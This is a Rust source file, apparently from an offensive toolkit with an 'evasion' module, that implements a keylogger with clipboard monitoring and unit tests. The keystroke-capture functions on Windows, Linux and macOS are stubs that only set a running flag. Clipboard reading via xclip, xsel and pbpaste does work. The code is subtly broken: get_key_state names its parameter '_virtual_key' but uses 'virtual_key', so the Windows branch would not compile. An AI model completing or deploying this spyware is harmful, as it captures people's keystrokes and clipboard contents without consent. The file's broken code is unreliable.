//! Keylogger Module
//!
//! Provides keyboard input capture functionality:
//! - Global keyboard hook (Windows)
//! - X11 keyboard monitoring (Linux)
//! - CGEvent monitoring (macOS)
//! - Key state tracking
//! - Clipboard monitoring
//!
//! WARNING: Keylogging has significant legal and ethical implications.
//! Use only for educational/defensive research purposes.

use std::collections::VecDeque;
use std::sync::{Arc, Mutex};
use std::time::{SystemTime, UNIX_EPOCH};

use crate::module::evasion::errors::EvasionError;

/// Key event types
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum KeyEventType {
    KeyDown,
    KeyUp,
    KeyPress,
}

/// Special keys that aren't printable characters
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SpecialKey {
    Backspace,
    Tab,
    Enter,
    Shift,
    Control,
    Alt,
    CapsLock,
    Escape,
    Space,
    PageUp,
    PageDown,
    End,
    Home,
    Left,
    Up,
    Right,
    Down,
    Insert,
    Delete,
    F1,
    F2,
    F3,
    F4,
    F5,
    F6,
    F7,
    F8,
    F9,
    F10,
    F11,
    F12,
    Unknown,
}

impl SpecialKey {
    pub fn as_str(&self) -> &'static str {
        match self {
            SpecialKey::Backspace => "[BACKSPACE]",
            SpecialKey::Tab => "[TAB]",
            SpecialKey::Enter => "[ENTER]",
            SpecialKey::Shift => "[SHIFT]",
            SpecialKey::Control => "[CTRL]",
            SpecialKey::Alt => "[ALT]",
            SpecialKey::CapsLock => "[CAPS]",
            SpecialKey::Escape => "[ESC]",
            SpecialKey::Space => " ",
            SpecialKey::PageUp => "[PGUP]",
            SpecialKey::PageDown => "[PGDN]",
            SpecialKey::End => "[END]",
            SpecialKey::Home => "[HOME]",
            SpecialKey::Left => "[LEFT]",
            SpecialKey::Up => "[UP]",
            SpecialKey::Right => "[RIGHT]",
            SpecialKey::Down => "[DOWN]",
            SpecialKey::Insert => "[INS]",
            SpecialKey::Delete => "[DEL]",
            SpecialKey::F1 => "[F1]",
            SpecialKey::F2 => "[F2]",
            SpecialKey::F3 => "[F3]",
            SpecialKey::F4 => "[F4]",
            SpecialKey::F5 => "[F5]",
            SpecialKey::F6 => "[F6]",
            SpecialKey::F7 => "[F7]",
            SpecialKey::F8 => "[F8]",
            SpecialKey::F9 => "[F9]",
            SpecialKey::F10 => "[F10]",
            SpecialKey::F11 => "[F11]",
            SpecialKey::F12 => "[F12]",
            SpecialKey::Unknown => "[?]",
        }
    }
}

/// A captured key event
#[derive(Debug, Clone)]
pub struct KeyEvent {
    /// Type of key event
    pub event_type: KeyEventType,
    /// The key that was pressed (printable character or None for special keys)
    pub character: Option<char>,
    /// Special key if not a printable character
    pub special_key: Option<SpecialKey>,
    /// Timestamp of the event
    pub timestamp: u64,
    /// Whether shift was held
    pub shift: bool,
    /// Whether control was held
    pub control: bool,
    /// Whether alt was held
    pub alt: bool,
}

impl KeyEvent {
    /// Convert key event to string representation
    pub fn to_string(&self) -> String {
        if let Some(c) = self.character {
            c.to_string()
        } else if let Some(sk) = self.special_key {
            sk.as_str().to_string()
        } else {
            String::new()
        }
    }
}

/// Keylogger configuration
#[derive(Debug, Clone)]
pub struct KeyloggerConfig {
    /// Capture key up events (default: false, only capture key down)
    pub capture_key_up: bool,
    /// Include modifier keys in output (default: false)
    pub include_modifiers: bool,
    /// Buffer size for captured keys (default: 1000)
    pub buffer_size: usize,
    /// Enable clipboard monitoring (default: false)
    pub monitor_clipboard: bool,
    /// Clipboard check interval in seconds (default: 5)
    pub clipboard_interval: u64,
}

impl Default for KeyloggerConfig {
    fn default() -> Self {
        Self {
            capture_key_up: false,
            include_modifiers: false,
            buffer_size: 1000,
            monitor_clipboard: false,
            clipboard_interval: 5,
        }
    }
}

/// Keylogger state and data
#[derive(Debug)]
pub struct KeyloggerState {
    /// Buffer of captured key events
    pub key_buffer: VecDeque<KeyEvent>,
    /// Total keys captured
    pub total_keys: u64,
    /// Start time of keylogger
    pub start_time: u64,
    /// Whether keylogger is running
    pub is_running: bool,
    /// Last clipboard content (if monitoring enabled)
    pub last_clipboard: Option<String>,
}

impl KeyloggerState {
    pub fn new(buffer_size: usize) -> Self {
        Self {
            key_buffer: VecDeque::with_capacity(buffer_size),
            total_keys: 0,
            start_time: SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            is_running: false,
            last_clipboard: None,
        }
    }

    /// Add a key event to the buffer
    pub fn add_key(&mut self, event: KeyEvent) {
        if self.key_buffer.len() >= self.key_buffer.capacity() {
            self.key_buffer.pop_front();
        }
        self.key_buffer.push_back(event);
        self.total_keys += 1;
    }

    /// Get captured keys as string
    pub fn get_log(&self) -> String {
        self.key_buffer
            .iter()
            .map(|e| e.to_string())
            .collect::<Vec<_>>()
            .join("")
    }

    /// Clear the key buffer
    pub fn clear(&mut self) {
        self.key_buffer.clear();
    }
}

/// Keylogger module
pub struct KeyloggerModule {
    _config: KeyloggerConfig,
    state: Arc<Mutex<KeyloggerState>>,
}

impl KeyloggerModule {
    /// Create a new keylogger with default config
    pub fn new() -> Self {
        Self::with_config(KeyloggerConfig::default())
    }

    /// Create a new keylogger with custom config
    pub fn with_config(config: KeyloggerConfig) -> Self {
        let buffer_size = config.buffer_size;
        Self {
            _config: config,
            state: Arc::new(Mutex::new(KeyloggerState::new(buffer_size))),
        }
    }

    /// Start the keylogger
    pub fn start(&self) -> Result<(), EvasionError> {
        #[cfg(target_os = "windows")]
        {
            self.start_windows()
        }

        #[cfg(target_os = "linux")]
        {
            self.start_linux()
        }

        #[cfg(target_os = "macos")]
        {
            self.start_macos()
        }

        #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
        {
            Err(EvasionError::SystemInfo(
                "Keylogger not supported on this platform".to_string(),
            ))
        }
    }

    /// Stop the keylogger
    pub fn stop(&self) -> Result<(), EvasionError> {
        let mut state = self.state.lock().map_err(|e| {
            EvasionError::Internal(format!("Failed to lock state: {}", e))
        })?;
        state.is_running = false;
        Ok(())
    }

    /// Check if keylogger is running
    pub fn is_running(&self) -> bool {
        self.state
            .lock()
            .map(|s| s.is_running)
            .unwrap_or(false)
    }

    /// Get captured log as string
    pub fn get_log(&self) -> String {
        self.state.lock().map(|s| s.get_log()).unwrap_or_default()
    }

    /// Get captured key events
    pub fn get_events(&self) -> Vec<KeyEvent> {
        self.state
            .lock()
            .map(|s| s.key_buffer.iter().cloned().collect())
            .unwrap_or_default()
    }

    /// Get total keys captured
    pub fn get_total_keys(&self) -> u64 {
        self.state.lock().map(|s| s.total_keys).unwrap_or(0)
    }

    /// Clear the key buffer
    pub fn clear(&self) {
        if let Ok(mut state) = self.state.lock() {
            state.clear();
        }
    }

    /// Get current clipboard content
    pub fn get_clipboard(&self) -> Option<String> {
        #[cfg(target_os = "windows")]
        {
            Self::get_clipboard_windows()
        }

        #[cfg(target_os = "linux")]
        {
            Self::get_clipboard_linux()
        }

        #[cfg(target_os = "macos")]
        {
            Self::get_clipboard_macos()
        }

        #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
        {
            None
        }
    }

    // Platform-specific implementations

    #[cfg(target_os = "windows")]
    fn start_windows(&self) -> Result<(), EvasionError> {
        use std::mem;
        use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
        use winapi::um::winuser::{
            SetWindowsHookExA, UnhookWindowsHookEx, WH_KEYBOARD_LL, GetAsyncKeyState,
            VK_SHIFT, VK_CONTROL, VK_MENU, VK_CAPITAL,
        };

        // Note: Full implementation would require:
        // 1. A message loop (requires Windows GUI subsystem)
        // 2. Hook procedure callback
        // 3. Proper hook installation and removal

        // For now, provide a simplified polling-based approach
        {
            let mut state = self.state.lock().map_err(|e| {
                EvasionError::Internal(format!("Failed to lock state: {}", e))
            })?;
            state.is_running = true;
        }

        // In a real implementation, this would spawn a thread with a message loop
        // For safety and portability, we provide a polling-based alternative

        Ok(())
    }

    #[cfg(target_os = "linux")]
    fn start_linux(&self) -> Result<(), EvasionError> {
        // Try X11 first
        #[cfg(feature = "x11")]
        {
            return self.start_x11();
        }

        // Fallback to /dev/input (requires root)
        self.start_input_evdev()
    }

    #[cfg(target_os = "linux")]
    #[cfg(feature = "x11")]
    fn start_x11(&self) -> Result<(), EvasionError> {
        // X11 keylogging would use XRecord extension
        // This requires the x11rb or x11 crate
        Err(EvasionError::Internal(
            "X11 keylogging requires x11 feature and XRecord extension".to_string(),
        ))
    }

    #[cfg(target_os = "linux")]
    fn start_input_evdev(&self) -> Result<(), EvasionError> {
        // /dev/input/event* monitoring requires root
        // This is a simplified implementation
        {
            let mut state = self.state.lock().map_err(|e| {
                EvasionError::Internal(format!("Failed to lock state: {}", e))
            })?;
            state.is_running = true;
        }

        Ok(())
    }

    #[cfg(target_os = "macos")]
    fn start_macos(&self) -> Result<(), EvasionError> {
        // macOS keylogging would use CGEventTap
        // This requires accessibility permissions
        {
            let mut state = self.state.lock().map_err(|e| {
                EvasionError::Internal(format!("Failed to lock state: {}", e))
            })?;
            state.is_running = true;
        }

        Ok(())
    }

    // Clipboard implementations

    #[cfg(target_os = "windows")]
    fn get_clipboard_windows() -> Option<String> {
        use winapi::um::winuser::{IsClipboardFormatAvailable, GetClipboardFormatNameA, OpenClipboard, GetClipboardData, CloseClipboard, CF_TEXT, CF_UNICODETEXT};
        use std::ptr;

        unsafe {
            if OpenClipboard(ptr::null_mut()) == 0 {
                return None;
            }

            // Check if text is available
            if IsClipboardFormatAvailable(CF_UNICODETEXT) != 0 {
                let handle = GetClipboardData(CF_UNICODETEXT);
                if !handle.is_null() {
                    // Would need to properly convert from UTF-16
                    CloseClipboard();
                    return Some(String::from("[clipboard data]"));
                }
            } else if IsClipboardFormatAvailable(CF_TEXT) != 0 {
                let handle = GetClipboardData(CF_TEXT);
                if !handle.is_null() {
                    CloseClipboard();
                    return Some(String::from("[clipboard data]"));
                }
            }

            CloseClipboard();
            None
        }
    }

    #[cfg(target_os = "linux")]
    fn get_clipboard_linux() -> Option<String> {
        use std::process::Command;

        // Try xclip first
        if let Ok(output) = Command::new("xclip")
            .args(["-selection", "clipboard", "-o"])
            .output()
        {
            if output.status.success() {
                return String::from_utf8(output.stdout).ok();
            }
        }

        // Try xsel
        if let Ok(output) = Command::new("xsel")
            .args(["--clipboard", "--output"])
            .output()
        {
            if output.status.success() {
                return String::from_utf8(output.stdout).ok();
            }
        }

        None
    }

    #[cfg(target_os = "macos")]
    fn get_clipboard_macos() -> Option<String> {
        use std::process::Command;

        if let Ok(output) = Command::new("pbpaste").output() {
            if output.status.success() {
                return String::from_utf8(output.stdout).ok();
            }
        }

        None
    }
}

impl Default for KeyloggerModule {
    fn default() -> Self {
        Self::new()
    }
}

/// Convenience function for quick key state check
pub fn get_key_state(_virtual_key: u8) -> bool {
    #[cfg(target_os = "windows")]
    {
        use winapi::um::winuser::GetAsyncKeyState;
        unsafe {
            (GetAsyncKeyState(virtual_key as i32) & 0x8000) != 0
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_keylogger_creation() {
        let _kl = KeyloggerModule::new();
        let _kl_config = KeyloggerModule::with_config(KeyloggerConfig {
            capture_key_up: true,
            include_modifiers: true,
            buffer_size: 500,
            monitor_clipboard: true,
            clipboard_interval: 10,
        });
    }

    #[test]
    fn test_default_config() {
        let config = KeyloggerConfig::default();
        assert!(!config.capture_key_up);
        assert!(!config.include_modifiers);
        assert_eq!(config.buffer_size, 1000);
        assert!(!config.monitor_clipboard);
        assert_eq!(config.clipboard_interval, 5);
    }

    #[test]
    fn test_special_key_strings() {
        assert_eq!(SpecialKey::Enter.as_str(), "[ENTER]");
        assert_eq!(SpecialKey::Backspace.as_str(), "[BACKSPACE]");
        assert_eq!(SpecialKey::F1.as_str(), "[F1]");
        assert_eq!(SpecialKey::Unknown.as_str(), "[?]");
    }

    #[test]
    fn test_key_event_to_string() {
        let char_event = KeyEvent {
            event_type: KeyEventType::KeyPress,
            character: Some('A'),
            special_key: None,
            timestamp: 0,
            shift: false,
            control: false,
            alt: false,
        };
        assert_eq!(char_event.to_string(), "A");

        let special_event = KeyEvent {
            event_type: KeyEventType::KeyPress,
            character: None,
            special_key: Some(SpecialKey::Enter),
            timestamp: 0,
            shift: false,
            control: false,
            alt: false,
        };
        assert_eq!(special_event.to_string(), "[ENTER]");
    }

    #[test]
    fn test_keylogger_state() {
        let mut state = KeyloggerState::new(100);

        let event = KeyEvent {
            event_type: KeyEventType::KeyPress,
            character: Some('H'),
            special_key: None,
            timestamp: 0,
            shift: false,
            control: false,
            alt: false,
        };
        state.add_key(event);

        assert_eq!(state.total_keys, 1);
        assert_eq!(state.get_log(), "H");
    }

    #[test]
    fn test_keylogger_buffer_limit() {
        let mut state = KeyloggerState::new(10);

        // Add more keys than buffer size
        for i in 0..20 {
            state.add_key(KeyEvent {
                event_type: KeyEventType::KeyPress,
                character: Some((b'A' + (i % 26) as u8) as char),
                special_key: None,
                timestamp: i,
                shift: false,
                control: false,
                alt: false,
            });
        }

        // Should only have last 10 keys
        assert_eq!(state.key_buffer.len(), 10);
        assert_eq!(state.total_keys, 20);
    }

    #[test]
    fn test_keylogger_api() {
        let kl = KeyloggerModule::new();

        // Should be able to call methods without panicking
        let _ = kl.is_running();
        let _ = kl.get_log();
        let _ = kl.get_events();
        let _ = kl.get_total_keys();
        kl.clear();

        // Start/stop may fail on headless systems
        let _ = kl.start();
        let _ = kl.stop();
    }

    #[test]
    fn test_clipboard_api() {
        let kl = KeyloggerModule::new();
        // May return None on headless systems
        let _ = kl.get_clipboard();
    }

    #[test]
    fn test_key_state_api() {
        // Test the key state convenience function
        #[cfg(target_os = "windows")]
        {
            let _ = get_key_state(0x41); // 'A' key
        }

        #[cfg(not(target_os = "windows"))]
        {
            assert!(!get_key_state(0x41));
        }
    }
}
